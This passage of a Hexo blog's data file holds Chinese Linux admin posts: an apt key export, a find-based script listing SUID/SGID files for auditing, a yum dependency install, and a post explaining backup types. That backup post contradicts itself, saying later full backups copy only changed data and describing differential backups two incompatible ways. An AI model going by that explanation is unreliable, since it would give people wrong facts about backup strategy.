class=\"keyword\">in</span> trusted.gpg.d instead (see apt-key(8)).</span><br></pre></td></tr></table></figure>\n\n<p>上面这条命令的意思是：导出秘钥后8位为<code>0A53D5BB</code>的秘钥，导出到<code>/etc/apt/trusted.gpg.d/</code>目录下，并且命名为<code>appstore.gpg</code>。</p>\n<p>然后去存储秘钥的目录下验证，发现存在这样的一个文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:/etc/apt/trusted.gpg.d$ <span class=\"built_in\">ls</span> /etc/apt/trusted.gpg.d/</span><br><span class=\"line\">appstore.gpg       microsoft.gpg                          ubuntu-keyring-2012-cdimage.gpg</span><br><span class=\"line\">google-chrome.gpg  tickstep-packages-archive-keyring.gpg  ubuntu-keyring-2018-archive.gpg</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>最后，<code>sudo apt-key list</code>查看导出的秘钥并不会消失，但是执行<code>sudo apt update</code>不会再报警告了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获取:18 http://mirrors.aliyun.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [39.9 kB] </span><br><span class=\"line\">命中:19 https://dl.winehq.org/wine-builds/ubuntu focal InRelease                     </span><br><span class=\"line\">命中:20 http://file.tickstep.com/apt aliyunpan InRelease </span><br><span class=\"line\">已下载 3,765 kB，耗时 6秒 (654 kB/s)</span><br><span class=\"line\">正在读取软件包列表... 完成</span><br><span class=\"line\">正在分析软件包的依赖关系树... 完成</span><br><span class=\"line\">正在读取状态信息... 完成                 </span><br><span class=\"line\">有 11 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。</span><br><span class=\"line\">knight@knight:~/nustarain$ </span><br></pre></td></tr></table></figure>"},{"title":"检测带有 SUID SGID 的文件","date":"2023-10-01T04:59:49.000Z","_content":"\n### 背景\n\n在linux中，关于 SUID 和 SGID 这种特殊权限的使用，是非常谨慎的，稍有不慎，便有可能导致权限泄露。所以在工作中，常常需要对系统进行检测，重点关注除了 Linux 系统以外的带有类似 SUID 和 SGID 这种特殊权限的文件。下面是检测带有 SUID 和 SGID 特殊权限位的脚本，方便各位使用。\n\n<!-- more -->\n\n```bash 点击折叠\n#!/bin/bash\n\n# 检查是否提供了目录作为参数\nif [ $# -ne 1 ]; then\n    echo \"用法: $0 <目录路径>\"\n    exit 1\nfi\n\n# 获取要扫描的目录路径\nscan_directory=\"$1\"\n\n# 检查目录是否存在\nif [ ! -d \"$scan_directory\" ]; then\n    echo \"目录不存在: $scan_directory\"\n    exit 1\nfi\n\n# 创建一个存储结果的文件\noutput_file=\"suid_sgid_files.txt\"\ntouch \"$output_file\"\n\n# 搜索并记录SUID和SGID文件\necho \"$(date \"+%F %H:%M\")\" >> \"$output_file\"\necho \"以下是带有SUID和SGID权限的文件和目录：\" >> \"$output_file\"\nfind \"$scan_directory\" -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; >> \"$output_file\" 2>/dev/null\nfind \"$scan_directory\" -type d \\( -perm -4000 -o -perm -2000 \\) -exec ls -ld {} \\; >> \"$output_file\" 2>/dev/null\n\necho \"结果已保存到 $output_file\"\n```","source":"_posts/SUID-SGID.md","raw":"---\ntitle: 检测带有 SUID SGID 的文件\ndate: 2023-10-01 12:59:49\ncategories: 小玩意儿\ntags:\n  - Linux\n---\n\n### 背景\n\n在linux中，关于 SUID 和 SGID 这种特殊权限的使用，是非常谨慎的，稍有不慎，便有可能导致权限泄露。所以在工作中，常常需要对系统进行检测，重点关注除了 Linux 系统以外的带有类似 SUID 和 SGID 这种特殊权限的文件。下面是检测带有 SUID 和 SGID 特殊权限位的脚本，方便各位使用。\n\n<!-- more -->\n\n```bash 点击折叠\n#!/bin/bash\n\n# 检查是否提供了目录作为参数\nif [ $# -ne 1 ]; then\n    echo \"用法: $0 <目录路径>\"\n    exit 1\nfi\n\n# 获取要扫描的目录路径\nscan_directory=\"$1\"\n\n# 检查目录是否存在\nif [ ! -d \"$scan_directory\" ]; then\n    echo \"目录不存在: $scan_directory\"\n    exit 1\nfi\n\n# 创建一个存储结果的文件\noutput_file=\"suid_sgid_files.txt\"\ntouch \"$output_file\"\n\n# 搜索并记录SUID和SGID文件\necho \"$(date \"+%F %H:%M\")\" >> \"$output_file\"\necho \"以下是带有SUID和SGID权限的文件和目录：\" >> \"$output_file\"\nfind \"$scan_directory\" -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; >> \"$output_file\" 2>/dev/null\nfind \"$scan_directory\" -type d \\( -perm -4000 -o -perm -2000 \\) -exec ls -ld {} \\; >> \"$output_file\" 2>/dev/null\n\necho \"结果已保存到 $output_file\"\n```","slug":"SUID-SGID","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ep003w7zj37kgu0am1","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>在linux中，关于 SUID 和 SGID 这种特殊权限的使用，是非常谨慎的，稍有不慎，便有可能导致权限泄露。所以在工作中，常常需要对系统进行检测，重点关注除了 Linux 系统以外的带有类似 SUID 和 SGID 这种特殊权限的文件。下面是检测带有 SUID 和 SGID 特殊权限位的脚本，方便各位使用。</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><figcaption><span>点击折叠</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查是否提供了目录作为参数</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> -ne 1 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;用法: <span class=\"variable\">$0</span> &lt;目录路径&gt;&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取要扫描的目录路径</span></span><br><span class=\"line\">scan_directory=<span class=\"string\">&quot;<span class=\"variable\">$1</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查目录是否存在</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ ! -d <span class=\"string\">&quot;<span class=\"variable\">$scan_directory</span>&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;目录不存在: <span class=\"variable\">$scan_directory</span>&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建一个存储结果的文件</span></span><br><span class=\"line\">output_file=<span class=\"string\">&quot;suid_sgid_files.txt&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">touch</span> <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 搜索并记录SUID和SGID文件</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">$(date <span class=\"string\">&quot;+%F %H:%M&quot;</span>)</span>&quot;</span> &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;以下是带有SUID和SGID权限的文件和目录：&quot;</span> &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span></span><br><span class=\"line\">find <span class=\"string\">&quot;<span class=\"variable\">$scan_directory</span>&quot;</span> -<span class=\"built_in\">type</span> f \\( -perm -4000 -o -perm -2000 \\) -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> -l &#123;&#125; \\; &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span> 2&gt;/dev/null</span><br><span class=\"line\">find <span class=\"string\">&quot;<span class=\"variable\">$scan_directory</span>&quot;</span> -<span class=\"built_in\">type</span> d \\( -perm -4000 -o -perm -2000 \\) -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> -ld &#123;&#125; \\; &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span> 2&gt;/dev/null</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;结果已保存到 <span class=\"variable\">$output_file</span>&quot;</span></span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>在linux中，关于 SUID 和 SGID 这种特殊权限的使用，是非常谨慎的，稍有不慎，便有可能导致权限泄露。所以在工作中，常常需要对系统进行检测，重点关注除了 Linux 系统以外的带有类似 SUID 和 SGID 这种特殊权限的文件。下面是检测带有 SUID 和 SGID 特殊权限位的脚本，方便各位使用。</p>","more":"<figure class=\"highlight bash\"><figcaption><span>点击折叠</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查是否提供了目录作为参数</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> -ne 1 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;用法: <span class=\"variable\">$0</span> &lt;目录路径&gt;&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取要扫描的目录路径</span></span><br><span class=\"line\">scan_directory=<span class=\"string\">&quot;<span class=\"variable\">$1</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查目录是否存在</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ ! -d <span class=\"string\">&quot;<span class=\"variable\">$scan_directory</span>&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;目录不存在: <span class=\"variable\">$scan_directory</span>&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建一个存储结果的文件</span></span><br><span class=\"line\">output_file=<span class=\"string\">&quot;suid_sgid_files.txt&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">touch</span> <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 搜索并记录SUID和SGID文件</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">$(date <span class=\"string\">&quot;+%F %H:%M&quot;</span>)</span>&quot;</span> &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;以下是带有SUID和SGID权限的文件和目录：&quot;</span> &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span></span><br><span class=\"line\">find <span class=\"string\">&quot;<span class=\"variable\">$scan_directory</span>&quot;</span> -<span class=\"built_in\">type</span> f \\( -perm -4000 -o -perm -2000 \\) -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> -l &#123;&#125; \\; &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span> 2&gt;/dev/null</span><br><span class=\"line\">find <span class=\"string\">&quot;<span class=\"variable\">$scan_directory</span>&quot;</span> -<span class=\"built_in\">type</span> d \\( -perm -4000 -o -perm -2000 \\) -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> -ld &#123;&#125; \\; &gt;&gt; <span class=\"string\">&quot;<span class=\"variable\">$output_file</span>&quot;</span> 2&gt;/dev/null</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;结果已保存到 <span class=\"variable\">$output_file</span>&quot;</span></span><br></pre></td></tr></table></figure>"},{"title":"一键安装源码依赖包","date":"2023-10-14T04:44:13.000Z","_content":"\n在某些条件限制下，经常会遇到源码安装的情况，尤其是对于新的机器来讲，从头梳理源码安装依赖包可是一件头疼的事情，所以整理了一些常见且常用的源码安装依赖包，以备不时之需。\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel\n```\n\n<!-- more -->\n\n如果遇到一些报错信息，可以采用如下命令尝试解决：\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel --allowerasing --nobest\n```","source":"_posts/SoucecodeInstallFping.md","raw":"---\ntitle: 一键安装源码依赖包\ndate: 2023-10-14 12:44:13\ncategories: 小玩意儿\ntags:\n  - Linux\n---\n\n在某些条件限制下，经常会遇到源码安装的情况，尤其是对于新的机器来讲，从头梳理源码安装依赖包可是一件头疼的事情，所以整理了一些常见且常用的源码安装依赖包，以备不时之需。\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel\n```\n\n<!-- more -->\n\n如果遇到一些报错信息，可以采用如下命令尝试解决：\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel --allowerasing --nobest\n```","slug":"SoucecodeInstallFping","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5eq003z7zj37vlp7c3w","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>在某些条件限制下，经常会遇到源码安装的情况，尤其是对于新的机器来讲，从头梳理源码安装依赖包可是一件头疼的事情，所以整理了一些常见且常用的源码安装依赖包，以备不时之需。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>如果遇到一些报错信息，可以采用如下命令尝试解决：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel --allowerasing --nobest</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>在某些条件限制下，经常会遇到源码安装的情况，尤其是对于新的机器来讲，从头梳理源码安装依赖包可是一件头疼的事情，所以整理了一些常见且常用的源码安装依赖包，以备不时之需。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel</span><br></pre></td></tr></table></figure>","more":"<p>如果遇到一些报错信息，可以采用如下命令尝试解决：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel --allowerasing --nobest</span><br></pre></td></tr></table></figure>"},{"title":"完整备份、增量备份、差异备份","date":"2023-10-04T14:24:27.000Z","_content":"\n备份是一种数据保护策略，它旨在防止数据丢失或恢复已丢失的数据。在备份中，有三种常见的备份类型：完整备份、增量备份和差异备份。以下是对这三种备份类型的详细解释：\n\n<!-- more -->\n\n### 完整备份（Full Backup）\n\n- 完整备份是最基本的备份类型。它会备份所有选定的数据和文件，包括整个文件系统或指定的目录。\n- 第一次完整备份通常需要时间较长，因为它备份了所有数据。\n- 后续的完整备份通常只会备份自上次完整备份以来更改的数据。\n- 完整备份的优点是恢复速度快，因为它包含了所有数据，但缺点是需要更多的存储空间。\n\n### 增量备份（Incremental Backup）\n\n- 增量备份只备份自上次备份以来发生更改的数据。它记录了每个备份的时间点，并备份自上次备份后新添加或修改的文件。\n- 第一次增量备份通常与完整备份相似，备份所有数据。\n- 后续的增量备份只备份自上次增量备份以来更改的数据。\n- 增量备份通常需要较少的存储空间，但在恢复时需要多个备份集合。\n\n### 差异备份（Differential Backup）\n\n- 差异备份备份自上次完整备份以来发生更改的数据，而不是自上次备份以来的所有更改。\n- 第一次差异备份通常与完整备份相似，备份所有数据。\n- 后续的差异备份只备份自上次差异备份以来更改的数据，而不是自上次完整备份以来的所有更改。\n- 差异备份需要较少的存储空间，比完整备份更快，但比增量备份需要更多的存储空间。\n\n### 总结\n- 完整备份备份所有数据，恢复速度快，但需要更多的存储空间。\n- 增量备份备份自上次备份以来的更改，存储空间较少，但需要多个备份集合来恢复。\n- 差异备份备份自上次完整备份以来的更改，存储空间较少，恢复速度相对较快。\n\n选择备份类型取决于存储需求、恢复时间和备份策略。通常，组合使用完整备份和增量或差异备份可以提供有效的数据保护策略。","source":"_posts/backup-style.md","raw":"---\ntitle: 完整备份、增量备份、差异备份\ndate: 2023-10-04 22:24:27\ncategories:\n  - 理论知识\ntags:\n  - 存储\n  - 面试\n---\n\n备份是一种数据保护策略，它旨在防止数据丢失或恢复已丢失的数据。在备份中，有三种常见的备份类型：完整备份、增量备份和差异备份。以下是对这三种备份类型的详细解释：\n\n<!-- more -->\n\n### 完整备份（Full Backup）\n\n- 完整备份是最基本的备份类型。它会备份所有选定的数据和文件，包括整个文件系统或指定的目录。\n- 第一次完整备份通常需要时间较长，因为它备份了所有数据。\n- 后续的完整备份通常只会备份自上次完整备份以来更改的数据。\n- 完整备份的优点是恢复速度快，因为它包含了所有数据，但缺点是需要更多的存储空间。\n\n### 增量备份（Incremental Backup）\n\n- 增量备份只备份自上次备份以来发生更改的数据。它记录了每个备份的时间点，并备份自上次备份后新添加或修改的文件。\n- 第一次增量备份通常与完整备份相似，备份所有数据。\n- 后续的增量备份只备份自上次增量备份以来更改的数据。\n- 增量备份通常需要较少的存储空间，但在恢复时需要多个备份集合。\n\n### 差异备份（Differential Backup）\n\n- 差异备份备份自上次完整备份以来发生更改的数据，而不是自上次备份以来的所有更改。\n- 第一次差异备份通常与完整备份相似，备份所有数据。\n- 后续的差异备份只备份自上次差异备份以来更改的数据，而不是自上次完整备份以来的所有更改。\n- 差异备份需要较少的存储空间，比完整备份更快，但比增量备份需要更多的存储空间。\n\n### 总结\n- 完整备份备份所有数据，恢复速度快，但需要更多的存储空间。\n- 增量备份备份自上次备份以来的更改，存储空间较少，但需要多个备份集合来恢复。\n- 差异备份备份自上次完整备份以来的更改，存储空间较少，恢复速度相对较快。\n\n选择备份类型取决于存储需求、恢复时间和备份策略。通常，组合使用完整备份和增量或差异备份可以提供有效的数据保护策略。","slug":"backup-style","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5er00437zj34u9uf2hv","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>备份是一种数据保护策略，它旨在防止数据丢失或恢复已丢失的数据。在备份中，有三种常见的备份类型：完整备份、增量备份和差异备份。以下是对这三种备份类型的详细解释：</p>\n<span id=\"more\"></span>\n\n<h3 id=\"完整备份（Full-Backup）\"><a href=\"#完整备份（Full-Backup）\" class=\"headerlink\" title=\"完整备份（Full Backup）\"></a>完整备份（Full 